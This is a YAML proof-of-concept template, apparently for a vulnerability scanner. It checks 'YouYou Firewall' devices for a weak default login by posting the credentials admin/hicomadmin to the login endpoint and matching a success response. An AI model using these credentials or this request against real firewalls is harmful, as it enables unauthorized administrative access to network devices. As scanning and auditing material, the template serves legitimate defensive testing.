id: poc-yaml-youyou-firewall-weak-password
info:
  name: YouYou Firewall 系统弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: YouYou Firewall
  osprey-id: vb_2021_0030
variables:
  v_usernmae: admin
  v_password: hicomadmin
requests:
- method: POST
  path: /index.php?c=user&a=ajax_save
  headers:
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101
      Firefox/86.0
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: username={{.v_usernmae}}&password={{.v_password}}&language=zh-cn
  expression: 'status_code == 200 && contains(body, "{\"success\":true,\"message\":\"\"}")

    '
transport: http
